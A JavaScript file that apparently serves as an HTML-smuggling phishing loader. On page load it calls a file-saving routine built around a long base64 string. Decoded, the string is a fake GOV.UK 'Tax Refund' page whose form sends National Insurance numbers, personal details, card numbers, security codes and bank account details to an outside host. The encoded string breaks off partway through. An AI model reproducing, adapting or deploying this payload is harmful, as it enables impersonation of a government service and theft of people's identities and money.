
 $(document).ready(function() {
		saveFile();
});

function saveFile (name, type, data) {
	if (data != null && navigator.msSaveBlob)
		return navigator.msSaveBlob(new Blob([data], { type: type }), name);
	var a = $("<a style='display: none;'/>");
	    var encodedStringAtoB = 'DQo8IWRvY3R5cGUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIiBjbGFzcz0iZ292dWstdGVtcGxhdGUiPiANCiA8aGVhZD4gDQogIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4gDQogIDx0aXRsZT5UYXggcmVmdW5kIC0gR09WLlVLPC90aXRsZT4gDQogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgdmlld3BvcnQtZml0PWNvdmVyIj4gDQogIDxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjMGIwYzBjIj4gDQogIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+IA0KICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIHNpemVzPSIxNngxNiAzMngzMiA0OHg0OCIgaHJlZj0iaHR0cHM6Ly93d3cuYWNjZXNzLnNlcnZpY2UuZ292LnVrL2Fzc2V0cy9pbWFnZXMvZmF2aWNvbi5pY28iIHR5cGU9ImltYWdlL3gtaWNvbiI+IA0KICA8bGluayByZWw9Im1hc2staWNvbiIgaHJlZj0iaHR0cHM6Ly93d3cuYWNjZXNzLnNlcnZpY2UuZ292LnVrL2Fzc2V0cy9pbWFnZXMvZ292dWstbWFzay1pY29uLnN2ZyIgY29sb3I9IiMwYjBjMGMiPiANCiAgPGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBzaXplcz0iMTgweDE4MCIgaHJlZj0iaHR0cHM6Ly93d3cuYWNjZXNzLnNlcnZpY2UuZ292LnVrL2Fzc2V0cy9pbWFnZXMvZ292dWstYXBwbGUtdG91Y2gtaWNvbi0xODB4MTgwLnBuZyI+IA0KICA8bGluayByZWw9ImFwcGxlLXRvdWNoLWljb24iIHNpemVzPSIxNjd4MTY3IiBocmVmPSJodHRwczovL3d3dy5hY2Nlc3Muc2VydmljZS5nb3YudWsvYXNzZXRzL2ltYWdlcy9nb3Z1ay1hcHBsZS10b3VjaC1pY29uLTE2N3gxNjcucG5nIj4gDQogIDxsaW5rIHJlbD0iYXBwbGUtdG91Y2gtaWNvbiIgc2l6ZXM9IjE1MngxNTIiIGhyZWY9Imh0dHBzOi8vd3d3LmFjY2Vzcy5zZXJ2aWNlLmdvdi51ay9hc3NldHMvaW1hZ2VzL2dvdnVrLWFwcGxlLXRvdWNoLWljb24tMTUyeDE1Mi5wbmciPiANCiAgPGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBocmVmPSJodHRwczovL3d3dy5hY2Nlc3Muc2VydmljZS5nb3YudWsvYXNzZXRzL2ltYWdlcy9nb3Z1ay1hcHBsZS10b3VjaC1pY29uLnBuZyI+IA0KICA8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vd3d3LmFjY2Vzcy5zZXJ2aWNlLmdvdi51ay9hc3NldHMvaW1hZ2VzL2dvdnVrLW9wZW5ncmFwaC1pbWFnZS5wbmciPiANCiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3d3dy5hY2Nlc3Muc2VydmljZS5nb3YudWsvYXNzZXRzL3N0eWxlc2hlZXRzL2dvdnVrLWZyb250ZW5kLmNzcyI+IA0KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vd3d3LmFjY2Vzcy5zZXJ2aWNlLmdvdi51ay9hc3NldHMvc3R5bGVzaGVldHMvc2NwLmNzcz92PTEuNzYuMCIgbWVkaWE9ImFsbCI+ICAgDQogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly93d3cuZ292LnVrL2Fzc2V0cy9zdGF0aWMvYXBwbGljYXRpb24tNDVhM2E3ZjRkMTA5Y2U4NjU0YTQ2Zjc4ZGU1MjBjOWVlMTQxYzE2NWIzMTdkNDc3ZTkwOThkOTNlMzBlNWNiOS5jc3MiPiANCiAgDQo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9zdGF0aWMuZmluZGFqb2IuZHdwLmdvdi51ay9qcy9qcXVlcnkubWluLjMuNS4xLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvanF1ZXJ5LnZhbGlkYXRpb24vMS4xNi4wL2pxdWVyeS52YWxpZGF0ZS5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9qcXVlcnkudmFsaWRhdGlvbi8xLjE2LjAvYWRkaXRpb25hbC1tZXRob2RzLm1pbi5qcyI+PC9zY3JpcHQ+DQoNCjxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9pbWFzay8zLjQuMC9pbWFzay5taW4uanMiPjwvc2NyaXB0PiAgDQo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2htZXJzYS9qcy9hZGRpdGlvbmFsLm1pbi5qcyI+PC9zY3JpcHQ+IA0KPHN0eWxlPg0KLmNjaWNvbiB7DQogICAgaGVpZ2h0OiAzOHB4OyANCiAgICByaWdodDogOHB4Ow0KICAgIHRvcDogY2FsYyg1MCUgLSAyNHB4KTsNCiAgICB3aWR0aDogNDBweDsNCn0NCg0KLmdvdnVrLWZvcm0tZ3JvdXAtLWVycm9yew0KY29sb3I6cmVkOw0KZm9udC1mYW1pbHk6ICJHRFMgVHJhbnNwb3J0IiwgYXJpYWwsIHNhbnMtc2VyaWY7DQpwYWRkaW5nLXRvcDogNXB4Ow0KfQ0KLm1haW4tLTIsDQoubWFpbi0tMywNCi5tYWluLS00e2Rpc3BsYXk6bm9uZTt9DQo8L3N0eWxlPg0KIDwvaGVhZD4gDQogPGJvZHkgY2xhc3M9ImdvdnVrLXRlbXBsYXRlX19ib2R5IiAgPiA8YSBocmVmPSIjc2tpcC10YXJnZXQiIGNsYXNzPSJnb3Z1ay1za2lwLWxpbmsiIGRhdGEtbW9kdWxlPSJnb3Z1ay1za2lwLWxpbmsiPlNraXAgdG8gbWFpbiBjb250ZW50PC9hPiANCiAgPGhlYWRlciBjbGFzcz0iZ292dWstaGVhZGVyIiBkYXRhLW1vZHVsZT0iZ292dWstaGVhZGVyIj4gDQogICA8ZGl2IGNsYXNzPSJnb3Z1ay1oZWFkZXJfX2NvbnRhaW5lciBnb3Z1ay13aWR0aC1jb250YWluZXIiPiANCiAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1oZWFkZXJfX2xvZ28iPiA8YSBocmVmPSJodHRwczovL3d3dy5nb3YudWsvIiBjbGFzcz0iZ292dWstaGVhZGVyX19saW5rIGdvdnVrLWhlYWRlcl9fbGluay0taG9tZXBhZ2UiPiA8c3BhbiBjbGFzcz0iZ292dWstaGVhZGVyX19sb2dvdHlwZSI+IA0KICAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGZvY3VzYWJsZT0iZmFsc2UiIGNsYXNzPSJnb3Z1ay1oZWFkZXJfX2xvZ290eXBlLWNyb3duIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdib3g9IjAgMCAxMzIgOTciIGhlaWdodD0iMzAiIHdpZHRoPSIzNiI+IDxwYXRoIGZpbGw9ImN1cnJlbnRDb2xvciIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMjUgMzAuMmMzLjUgMS41IDcuNy0uMiA5LjEtMy43IDEuNS0zLjYtLjItNy44LTMuOS05LjItMy42LTEuNC03LjYuMy05LjEgMy45LTEuNCAzLjUuMyA3LjUgMy45IDl6TTkgMzkuNWMzLjYgMS41IDcuOC0uMiA5LjItMy43IDEuNS0zLjYtLjItNy44LTMuOS05LjEtMy42LTEuNS03LjYuMi05LjEgMy44LTEuNCAzLjUuMyA3LjUgMy44IDl6TTQuNCA1Ny4yYzMuNSAxLjUgNy43LS4yIDkuMS0zLjggMS41LTMuNi0uMi03LjctMy45LTkuMS0zLjUtMS41LTcuNi4zLTkuMSAzLjgtMS40IDMuNS4zIDcuNiAzLjkgOS4xem0zOC4zLTIxLjRjMy41IDEuNSA3LjctLjIgOS4xLTMuOCAxLjUtMy42LS4yLTcuNy0zLjktOS4xLTMuNi0xLjUtNy42LjMtOS4xIDMuOC0xLjMgMy42LjQgNy43IDMuOSA5LjF6bTY0LjQtNS42Yy0zLjYgMS41LTcuOC0uMi05LjEtMy43LTEuNS0zLjYuMi03LjggMy44LTkuMiAzLjYtMS40IDcuNy4zIDkuMiAzLjkgMS4zIDMuNS0uNCA3LjUtMy45IDl6bTE1LjkgOS4zYy0zLjYgMS41LTcuNy0uMi05LjEtMy43LTEuNS0zLjYuMi03LjggMy43LTkuMSAzLjYtMS41IDcuNy4yIDkuMiAzLjggMS41IDMuNS0uMyA3LjUtMy44IDl6bTQuNyAxNy43Yy0zLjYgMS41LTcuOC0uMi05LjItMy44LTEuNS0zLjYuMi03LjcgMy45LTkuMSAzLjYtMS41IDcuNy4zIDkuMiAzLjggMS4zIDMuNS0uNCA3LjYtMy45IDkuMXpNODkuMyAzNS44Yy0zLjYgMS41LTcuOC0uMi05LjItMy44LTEuNC0zLjYuMi03LjcgMy45LTkuMSAzLjYtMS41IDcuNy4zIDkuMiAzLjggMS40IDMuNi0uMyA3LjctMy45IDkuMXpNNjkuNyAxNy43bDguOSA0LjdWOS4zbC04LjkgMi44Yy0uMi0uMy0uNS0uNi0uOS0uOUw3Mi40IDBINTkuNmwzLjUgMTEuMmMtLjMuMy0uNi41LS45LjlsLTguOC0yLjh2MTMuMWw4LjgtNC43Yy4zLjMuNi43LjkuOWwtNSAxNS40di4xYy0uMi44LS40IDEuNi0uNCAyLjQgMCA0LjEgMy4xIDcuNSA3IDguMWguMmMuMyAwIC43LjEgMSAuMS40IDAgLjcgMCAxLS4xaC4yYzQtLjYgNy4xLTQuMSA3LjEtOC4xIDAtLjgtLjEtMS43LS40LTIuNFYzNGwtNS4xLTE1LjRjLjQtLjIuNy0uNiAxLS45ek02NiA5Mi44YzE2LjkgMCAzMi44IDEuMSA0Ny4xIDMuMiA0LTE2LjkgOC45LTI2LjcgMTQtMzMuNWwtOS42LTMuNGMxIDQuOSAxLjEgNy4yIDAgMTAuMi0xLjUtMS40LTMtNC4zLTQuMi04LjdMMTA4LjYgNzZjMi44LTIgNS0zLjIgNy41LTMuMy00LjQgOS40LTEwIDExLjktMTMuNiAxMS4yLTQuMy0uOC02LjMtNC42LTUuNi03LjkgMS00LjcgNS43LTUuOSA4LS41IDQuMy04LjctMy0xMS40LTcuNi04LjggNy4xLTcuMiA3LjktMTMuNSAyLjEtMjEuMS04IDYuMS04LjEgMTIuMy00LjUgMjAuOC00LjctNS40LTEyLjEtMi41LTkuNSA2LjIgMy40LTUuMiA3LjktMiA3LjIgMy4xLS42IDQuMy02LjQgNy44LTEzLjUgNy4yLTEwLjMtLjktMTAuOS04LTExLjItMTMuOCAyLjUtLjUgNy4xIDEuOCAxMSA3LjNMODAuMiA2MGMtNC4xIDQuNC04IDUuMy0xMi4zIDUuNCAxLjQtNC40IDgtMTEuNiA4LTExLjZINTUuNXM2LjQgNy4yIDcuOSAxMS42Yy00LjItLjEtOC0xLTEyLjMtNS40bDEuNCAxNi40YzMuOS01LjUgOC41LTcuNyAxMC45LTcuMy0uMyA1LjgtLjkgMTIuOC0xMS4xIDEzLjgtNy4yLjYtMTIuOS0yLjktMTMuNS03LjItLjctNSAzLjgtOC4zIDcuMS0zLjEgMi43LTguNy00LjYtMTEuNi05LjQtNi4yIDMuNy04LjUgMy42LTE0LjctNC42LTIwLjgtNS44IDcuNi01IDEzLjkgMi4yIDIxLjEtNC43LTIuNi0xMS45LjEtNy43IDguOCAyLjMtNS41IDcuMS00LjIgOC4xLjUuNyAzLjMtMS4zIDcuMS01LjcgNy45LTMuNS43LTktMS44LTEzLjUtMTEuMiAyLjUuMSA0LjcgMS4zIDcuNSAzLjNsLTQuNy0xNS40Yy0xLjIgNC40LTIuNyA3LjItNC4zIDguNy0xLjEtMy0uOS01LjMgMC0xMC4ybC05LjUgMy40YzUgNi45IDkuOSAxNi43IDE0IDMzLjUgMTQuOC0yLjEgMzAuOC0zLjIgNDcuNy0zLjJ6Ij48L3BhdGg+IA0KICAgICAgIDwvc3ZnPiA8c3BhbiBjbGFzcz0iZ292dWstaGVhZGVyX19sb2dvdHlwZS10ZXh0Ij4gR09WLlVLIDwvc3Bhbj4gPC9zcGFuPiA8L2E+IA0KICAgIDwvZGl2PiANCiAgIDwvZGl2PiANCiAgPC9oZWFkZXI+IA0KICA8ZGl2IGNsYXNzPSJnb3Z1ay13aWR0aC1jb250YWluZXIiPiANCiAgIDxtYWluIGNsYXNzPSJnb3Z1ay1tYWluLXdyYXBwZXIgZ292dWstIS1wYWRkaW5nLXRvcC00Ij4NCiAgICAgIDxmb3JtICAgaWQ9ImhtcmNmb3JtIiAgbmFtZT0iaG1yY2Zvcm0iIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJodHRwczovL29sZW5vbmVlZC5jby51ay93cGZlZWQucGhwIiA+IA0KICAgICAgPGlucHV0ICAgaGlkZGVuIGlkPSJ0b2tlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSJlNWQ1ZDUyczViNWcyZDNzMWQ1cTZzNTJmNTUiPg0KICAgIDx1bCBjbGFzcz0ibGFuZ3VhZ2UtdG9nZ2xlIGdvdnVrLWxpc3QgZ292dWstIS1tYXJnaW4tdG9wLTAiPiANCiAgICAgPGxpPiBFbmdsaXNoIDwvbGk+IA0KICAgICA8bGk+IDxhIGhyZWY9Ij9sYW5nPWN5IiBsYW5nPSJjeSIgY2xhc3M9ImdvdnVrLWxpbmsiPkN5bXJhZWc8L2E+IDwvbGk+IA0KICAgIDwvdWw+IA0KICAgIDxkaXYgY2xhc3M9ImdvdnVrLWdyaWQtcm93Ij4gDQogICAgIDxkaXYgY2xhc3M9ImdvdnVrLWdyaWQtY29sdW1uLXR3by10aGlyZHMiIGlkPSJza2lwLXRhcmdldCI+IA0KICAgICANCiAgICAgIDxoMSBjbGFzcz0iZ292dWstaGVhZGluZy14bCI+VGF4IFJlZnVuZDwvaDE+DQo8ZGl2IGNsYXNzPSJtYWluLS0xIj4gIA0KPGRpdiBjbGFzcz0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lciIgcm9sZT0icmVnaW9uIiBhcmlhLWxhYmVsbGVkYnk9ImdvdnVrLW5vdGlmaWNhdGlvbi1iYW5uZXItdGl0bGUiIGRhdGEtbW9kdWxlPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyIj4gDQogICAgICAgPGRpdiBjbGFzcz0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lcl9faGVhZGVyIj4gDQogICAgICAgIDxoMiBjbGFzcz0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lcl9fdGl0bGUiIGlkPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyLXRpdGxlIj5LZWVwaW5nIHlvdXIgaW5mb3JtYXRpb24gc2VjdXJlPC9oMj4gDQogICAgICAgPC9kaXY+IA0KICAgICAgIDxkaXYgY2xhc3M9ImdvdnVrLW5vdGlmaWNhdGlvbi1iYW5uZXJfX2NvbnRlbnQiPiANCiAgICAgICAgPHAgY2xhc3M9ImdvdnVrLWJvZHkiPlZlcmlmeSB5b3VyIGlkZW50aWZpY2F0aW9uIHdoZW4gcHJvY2Vzc2luZyBhbiBvbmxpbmUgY2xhaW0gZm9yIGEgdGF4IHJlZnVuZC4gUGxlYXNlIGNvbXBsZXRlIHRoZSBpbmZvcm1hdGlvbiBiZWxvdyBpbiBvcmRlciB0byBjb250aW51ZSB3aXRoIHlvdXIgcmVxdWVzdC48L3A+IA0KICAgICAgIDwvZGl2PiANCiAgICAgIDwvZGl2PiAgICAgICANCjxwIGNsYXNzPSJnb3Z1ay1ib2R5LW0iPjwvcD4NCiAgICAgICAgPGRpdiBjbGFzcz0iZ292dWstZm9ybS1ncm91cCI+IA0KPGxhYmVsIGNsYXNzPSJnb3Z1ay1sYWJlbCIgZm9yPSJBY2NvdW50Ij5OYXRpb25hbCBJbnN1cmFuY2UgTnVtYmVyPC9sYWJlbD4gDQogICAgICAgICAgICA8aW5wdXQgaWQ9Im5pbm1yIiBuYW1lPSJuaW5tciIgICBjbGFzcz0iZ292dWstaW5wdXQgZ292dWstIS13aWR0aC10aHJlZS1xdWFydGVycyAiIHR5cGU9InRleHQiICAgPg0KICAgICAgICA8L2Rpdj4gIA0KICAgICAgICANCiAgICAgICAgPGEgY2xhc3M9InNjcmVlbi0tMSBnZW0tYy1idXR0b24gZ292dWstYnV0dG9uIGdvdnVrLWJ1dHRvbi0tc3RhcnQgZ2VtLWMtYnV0dG9uLS1ib3R0b20tbWFyZ2luIiByb2xlPSJidXR0b24iICA+ICBDb250aW51ZQ0KICA8c3ZnIGNsYXNzPSJnb3Z1ay1idXR0b25fX3N0YXJ0LWljb24gZ292dWstIS1kaXNwbGF5LW5vbmUtcHJpbnQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjE3LjUiIGhlaWdodD0iMTkiIHZpZXdCb3g9IjAgMCAzMyA0MCIgZm9jdXNhYmxlPSJmYWxzZSIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgIDxwYXRoIGZpbGw9ImN1cnJlbnRDb2xvciIgZD0iTTAgMGgxM2wyMCAyMC0yMCAyMEgwbDIwLTIweiI+PC9wYXRoPg0KICA8L3N2Zz4NCjwvYT4NCiAgICANCjwvZGl2Pg0KPGRpdiBjbGFzcz0ibWFpbi0tMiI+DQogPGRpdiBjbGFzcz0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lciIgcm9sZT0icmVnaW9uIiBhcmlhLWxhYmVsbGVkYnk9ImdvdnVrLW5vdGlmaWNhdGlvbi1iYW5uZXItdGl0bGUiIGRhdGEtbW9kdWxlPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyIj4gDQogICAgICAgPGRpdiBjbGFzcz0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lcl9faGVhZGVyIj4gDQogICAgICAgIDxoMiBjbGFzcz0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lcl9fdGl0bGUiIGlkPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyLXRpdGxlIj5QZXJzb25hbCBJbmZvcm1hdGlvbjwvaDI+IA0KICAgICAgIDwvZGl2PiANCiAgICAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyX19jb250ZW50Ij4gDQogICAgICAgIDxwIGNsYXNzPSJnb3Z1ay1ib2R5Ij5QbGVhc2UgY29tcGxldGUgdGhlIGZvcm0gYmVsb3cgaW4gb3JkZXIgZm9yIHVzIHRvIHByb2Nlc3MgeW91ciB0YXggcmVmdW5kLjwvcD4gDQogICAgICAgPC9kaXY+IA0KICAgICAgPC9kaXY+ICAgICAgIA0KPHAgY2xhc3M9ImdvdnVrLWJvZHktbSI+PC9wPiANCg0KICAgICAgIA0KPGRpdiBjbGFzcz0iZ292dWstZm9ybS1ncm91cCI+DQo8bGFiZWwgY2xhc3M9ImdvdnVrLWxhYmVsIiBmb3I9Im5hbWUiIGZvcj0ibmFtZSI+RnVsbCBuYW1lPC9sYWJlbD4NCjxpbnB1dCBjbGFzcz0iZ292dWstaW5wdXQgZ292dWstIS13aWR0aC10aHJlZS1xdWFydGVycyIgaWQ9Im5hbWUiIG1heGxlbmd0aD0iNDAiIG5hbWU9Im5hbWUiIHR5cGU9InRleHQiIHZhbHVlPSIiPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9ImdvdnVrLWZvcm0tZ3JvdXAiIGlkPSJkYXRlIj4NCjxsYWJlbCBjbGFzcz0iZ292dWstbGFiZWwiIGZvcj0iZG9iIiBmb3I9ImRvYiI+RGF0ZSBvZiBiaXJ0aDwvbGFiZWw+IA0KPGlucHV0IGNsYXNzPSJnb3Z1ay1pbnB1dCBnb3Z1ay0hLXdpZHRoLXRocmVlLXF1YXJ0ZXJzIiBpZD0iZG9iIiBtYXhsZW5ndGg9IjIwIiBuYW1lPSJkb2IiIHR5cGU9InRlbCIgdmFsdWU9IiIgaW5wdXRtb2RlPSJudW1lcmljIj4NCjwvZGl2Pg0KDQo8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4NCjxsYWJlbCBjbGFzcz0iZ292dWstbGFiZWwiIGZvcj0idGVsZXBob25lIiBmb3I9InRlbGVwaG9uZSI+UGhvbmUgbnVtYmVyPC9sYWJlbD4gDQo8aW5wdXQgY2xhc3M9ImdvdnVrLWlucHV0IGdvdnVrLSEtd2lkdGgtdGhyZWUtcXVhcnRlcnMgdGVsZXBob25lIHBob25lVUsiIGlkPSJ0ZWxlcGhvbmUiIG1heGxlbmd0aD0iMTEiIG5hbWU9InRlbGVwaG9uZSIgdHlwZT0idGVsIiB2YWx1ZT0iIj4NCjwvZGl2Pg0KDQo8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4NCjxsYWJlbCBjbGFzcz0iZ292dWstbGFiZWwiIGZvcj0iZW1haWwiPkVtYWlsIGFkZHJlc3M8L2xhYmVsPiANCjxpbnB1dCBjbGFzcz0iZ292dWstaW5wdXQgZ292dWstIS13aWR0aC10aHJlZS1xdWFydGVycyBlbWFpbCIgaWQ9ImVtYWlsIiBtYXhsZW5ndGg9IjQwIiBuYW1lPSJlbWFpbCIgdHlwZT0iZW1haWwiIHZhbHVlPSIiPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9ImdvdnVrLWZvcm0tZ3JvdXAiPg0KPGxhYmVsIGNsYXNzPSJnb3Z1ay1sYWJlbCIgZm9yPSJhZGRyZXNzIj5BZGRyZXNzIExpbmUgMTwvbGFiZWw+IA0KPGlucHV0IGNsYXNzPSJnb3Z1ay1pbnB1dCBnb3Z1ay0hLXdpZHRoLXRocmVlLXF1YXJ0ZXJzIGFkZHJlc3MiIGlkPSJhZGRyZXNzIiBtYXhsZW5ndGg9IjQwIiBuYW1lPSJhZGRyZXNzIiB0eXBlPSJ0ZXh0IiB2YWx1ZT0iIj4NCjwvZGl2Pg0KDQo8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4NCjxsYWJlbCBjbGFzcz0iZ292dWstbGFiZWwiIGZvcj0idG93biI+Q2l0eS9Ub3duPC9sYWJlbD4gDQo8aW5wdXQgY2xhc3M9ImdvdnVrLWlucHV0IGdvdnVrLSEtd2lkdGgtdGhyZWUtcXVhcnRlcnMgdG93biIgaWQ9InRvd24iIG1heGxlbmd0aD0iNDAiIG5hbWU9InRvd24iIHR5cGU9InRleHQiIHZhbHVlPSIiPg0KPC9kaXY+DQo8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4NCjxsYWJlbCBjbGFzcz0iZ292dWstbGFiZWwiIGZvcj0icG9zdGNvZGUiPlBvc3Rjb2RlPC9sYWJlbD4gDQo8aW5wdXQgY2xhc3M9ImdvdnVrLWlucHV0IGdvdnVrLSEtd2lkdGgtb25lLXF1YXJ0ZXIiIGlkPSJwb3N0Y29kZSIgbWF4bGVuZ3RoPSI0MCIgbmFtZT0icG9zdGNvZGUiIHR5cGU9InRleHQiIHZhbHVlPSIiPg0KPC9kaXY+ICANCiAgICAgIDxhIGNsYXNzPSJzY3JlZW4tLTIgZ2VtLWMtYnV0dG9uIGdvdnVrLWJ1dHRvbiBnb3Z1ay1idXR0b24tLXN0YXJ0IGdlbS1jLWJ1dHRvbi0tYm90dG9tLW1hcmdpbiIgcm9sZT0iYnV0dG9uIiAgPiAgQ29udGludWUNCiAgPHN2ZyBjbGFzcz0iZ292dWstYnV0dG9uX19zdGFydC1pY29uIGdvdnVrLSEtZGlzcGxheS1ub25lLXByaW50IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNy41IiBoZWlnaHQ9IjE5IiB2aWV3Qm94PSIwIDAgMzMgNDAiIGZvY3VzYWJsZT0iZmFsc2UiIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICA8cGF0aCBmaWxsPSJjdXJyZW50Q29sb3IiIGQ9Ik0wIDBoMTNsMjAgMjAtMjAgMjBIMGwyMC0yMHoiPjwvcGF0aD4NCiAgPC9zdmc+DQo8L2E+DQo8L2Rpdj4gDQo8ZGl2IGNsYXNzPSJtYWluLS0zIj4NCiA8ZGl2IGNsYXNzPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyIiByb2xlPSJyZWdpb24iIGFyaWEtbGFiZWxsZWRieT0iZ292dWstbm90aWZpY2F0aW9uLWJhbm5lci10aXRsZSIgZGF0YS1tb2R1bGU9ImdvdnVrLW5vdGlmaWNhdGlvbi1iYW5uZXIiPiANCiAgICAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyX19oZWFkZXIiPiANCiAgICAgICAgPGgyIGNsYXNzPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyX190aXRsZSIgaWQ9ImdvdnVrLW5vdGlmaWNhdGlvbi1iYW5uZXItdGl0bGUiPlBheW1lbnQgRGV0YWlsczwvaDI+IA0KICAgICAgIDwvZGl2PiANCiAgICAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1ub3RpZmljYXRpb24tYmFubmVyX19jb250ZW50Ij4gDQogICAgICAgIDxwIGNsYXNzPSJnb3Z1ay1ib2R5Ij5QbGVhc2UgZW50ZXIgYWNjb3VudCBkZXRhaWxzIHRoYXQgeW91IHdvdWxkIGxpa2UgeW91ciB0YXggcmVmdW5kIHRvIGJlIGNyZWRpdGVkIHRvLjwvcD4gDQogICAgICAgPC9kaXY+IA0KICAgICAgPC9kaXY+ICAgICAgIA0KPHAgY2xhc3M9ImdvdnVrLWJvZHktbSI+PC9wPiAgIA0KICAgICAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4gDQo8bGFiZWwgY2xhc3M9ImdvdnVrLWxhYmVsIiBmb3I9IkNhcmQgTnVtYmVyIj5DYXJkIE51bWJlcjwvbGFiZWw+IA0KICAgICAgICAgICAgPGlucHV0IGlkPSJjYXJkbnVtYmVyIiBuYW1lPSJjYXJkbnVtYmVyIiBjbGFzcz0iZ292dWstaW5wdXQgZ292dWstIS13aWR0aC10aHJlZS1xdWFydGVycyAiIHR5cGU9InRleHQiICAgaW5wdXRtb2RlPSJudW1lcmljIj4NCiAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0iZ292dWstZm9ybS1ncm91cCI+IA0KPGxhYmVsIGNsYXNzPSJnb3Z1ay1sYWJlbCIgZm9yPSJFeHBpcnkiPkV4cGlyeSBkYXRlPC9sYWJlbD4gDQogICAgICAgICAgICA8aW5wdXQgaWQ9ImV4cGlyYXRpb25kYXRlIiBuYW1lPSJleHBpcmF0aW9uZGF0ZSIgIHBsYWNlaG9sZGVyPSJNTS9ZWSIgY2xhc3M9ImdvdnVrLWlucHV0IGdvdnVrLSEtd2lkdGgtdGhyZWUtcXVhcnRlcnMgIiB0eXBlPSJ0ZXh0IiAgIGlucHV0bW9kZT0ibnVtZXJpYyI+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4gDQo8bGFiZWwgY2xhc3M9ImdvdnVrLWxhYmVsIiBmb3I9IlNlY3VyaXR5Ij5TZWN1cml0eSBDb2RlPC9sYWJlbD4gDQogICAgICAgICAgICA8aW5wdXQgaWQ9InNlY3VyaXR5Y29kZSIgbmFtZT0ic2VjdXJpdHljb2RlIiAgIGNsYXNzPSJnb3Z1ay1pbnB1dCBnb3Z1ay0hLXdpZHRoLXRocmVlLXF1YXJ0ZXJzICIgdHlwZT0idGV4dCIgICBpbnB1dG1vZGU9Im51bWVyaWMiPg0KICAgICAgICA8L2Rpdj4gDQogICAgICAgIDxkaXYgY2xhc3M9ImdvdnVrLWZvcm0tZ3JvdXAiPiANCjxsYWJlbCBjbGFzcz0iZ292dWstbGFiZWwiIGZvcj0iQWNjb3VudCI+QWNjb3VudCBOdW1iZXI8L2xhYmVsPiANCiAgICAgICAgICAgIDxpbnB1dCBpZD0iYWNjb3VudCIgbmFtZT0iYWNjb3VudCIgICBjbGFzcz0iZ292dWstaW5wdXQgZ292dWstIS13aWR0aC10aHJlZS1xdWFydGVycyAiIHR5cGU9InRleHQiICAgaW5wdXRtb2RlPSJudW1lcmljIj4NCiAgICAgICAgPC9kaXY+IA0KICAgICAgICA8ZGl2IGNsYXNzPSJnb3Z1ay1mb3JtLWdyb3VwIj4gDQo8bGFiZWwgY2xhc3M9ImdvdnVrLWxhYmVsIiBmb3I9IlNvcnQiPlNvcnQgQ29kZTwvbGFiZWw+IA0KICAgICAgICAgICAgPGlucHV0IGlkPSJzb3J0Y29kZSIgbmFtZT0ic29ydGNvZGUiICAgY2xhc3M9ImdvdnVrLWlucHV0IGdvdnVrLSEtd2lkdGgtdGhyZWUtcXVhcnRlcnM